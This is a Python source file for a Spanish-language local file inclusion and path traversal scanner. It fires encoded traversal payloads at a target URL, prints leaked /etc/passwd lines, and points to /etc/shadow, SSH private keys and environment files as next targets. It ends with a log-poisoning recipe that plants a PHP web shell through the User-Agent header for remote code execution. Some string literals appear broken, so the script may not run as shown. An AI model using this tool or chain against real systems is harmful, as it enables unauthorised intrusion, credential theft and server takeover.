#!/usr/bin/env python3
"""
lfi_scanner.py -- Detector de Local File Inclusion y Path Traversal
Uso:
    python3 lfi_scanner.py --url "http://objetivo.com/page?file="
    python3 lfi_scanner.py --url "http://objetivo.com/page?file=" --os windows
"""
import argparse, urllib.request, urllib.error, urllib.parse

class C:
    RED="[91m";GREEN="[92m";YELLOW="[93m"
    BLUE="[94m";BOLD="[1m";RESET="[0m"

def ok(m):   print(C.GREEN+"  [+] "+C.RESET+m)
def info(m): print(C.BLUE+"  [*] "+C.RESET+m)
def crit(m): print(C.RED+C.BOLD+"  [VULNERABLE] "+C.RESET+m)

LINUX_FILES   = ["/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd"]
WINDOWS_FILES = ["C:/Windows/System32/drivers/etc/hosts","C:\Windows\win.ini","../../../Windows/win.ini","../../../../Windows/System32/drivers/etc/hosts"]
ENCODINGS     = ["","../", "....//","..%2F","..%252F","%2e%2e%2f","..%c0%af","..%c1%9c"]

LINUX_SIGNATURES   = ["root:x:0:0","www-data","nobody","bin:x"]
WINDOWS_SIGNATURES = ["[fonts]","[extensions]","[files]","# Copyright"]

def fetch(url):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.read().decode("utf-8","ignore")
    except Exception:
        return ""

def banner():
    print("[93m[1m")
    print("  ╔═══════════════════════════════════════════╗")
    print("  ║   LFI SCANNER -- Path Traversal Detector  ║")
    print("  ╚═══════════════════════════════════════════╝")
    print("[0m")

def main():
    banner()
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True, help="URL con el parametro vulnerable (ej: http://web.com/page?file=)")
    p.add_argument("--os",  default="linux", choices=["linux","windows"])
    args = p.parse_args()

    base_url  = args.url
    target_files = LINUX_FILES if args.os == "linux" else WINDOWS_FILES
    signatures   = LINUX_SIGNATURES if args.os == "linux" else WINDOWS_SIGNATURES

    info("Objetivo: "+base_url)
    info("SO objetivo: "+args.os)
    info("Probando "+str(len(target_files))+" rutas de archivos sensibles...")
    print()

    found = False
    for file_path in target_files:
        url  = base_url + urllib.parse.quote(file_path, safe="/")
        body = fetch(url)
        for sig in signatures:
            if sig.lower() in body.lower():
                crit("LFI CONFIRMADO")
                crit("Payload: "+file_path)
                crit("URL: "+url[:120])
                if args.os == "linux":
                    lines = [l for l in body.split("
") if "root" in l or "www-data" in l]
                    for l in lines[:3]:
                        ok(l.strip())
                found = True
                break

    print()
    if not found:
        info("No se confirmo LFI con rutas basicas")
        info("Probar con wrappers PHP:")
        print("  "+base_url+"php://filter/convert.base64-encode/resource=index.php")
    else:
        info("Archivos interesantes para leer:")
        interesting = ["/proc/self/environ","/var/log/apache2/access.log",
                      "/home/usuario/.ssh/id_rsa","/etc/shadow"]
        for f in interesting:
            print("  "+base_url+f)
        print()
        info("Log Poisoning para RCE:")
        print("  1. curl -A "<?php system(\$_GET['cmd']); ?>" "+base_url.split("?")[0])
        print("  2. "+base_url+"/var/log/apache2/access.log&cmd=id")

if __name__ == "__main__":
    main()
